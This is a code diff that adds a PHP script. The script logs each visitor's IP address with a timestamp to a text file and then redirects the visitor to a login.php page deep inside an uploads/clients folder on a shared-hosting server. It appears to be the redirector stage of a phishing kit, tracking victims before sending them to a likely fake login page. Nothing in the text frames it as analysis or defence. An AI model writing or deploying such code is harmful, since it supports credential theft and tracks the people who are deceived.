@@ -1,0 +1,17 @@
+<?php
+// Open or create the file to store IP addresses
+$ipFile = 'ips.txt';
+
+// Get the user's IP address
+$userIP = $_SERVER['REMOTE_ADDR'];
+
+// Format the log entry (e.g., IP and timestamp)
+$logEntry = date('Y-m-d H:i:s') . " - " . $userIP . PHP_EOL;
+
+// Append the IP to the file
+file_put_contents($ipFile, $logEntry, FILE_APPEND | LOCK_EX);
+
+// Redirect the user
+header("Location:https://s162.servername.online/~prixi052/fr/uploads/xd/zd/clients/login.php");
+exit();
+?>
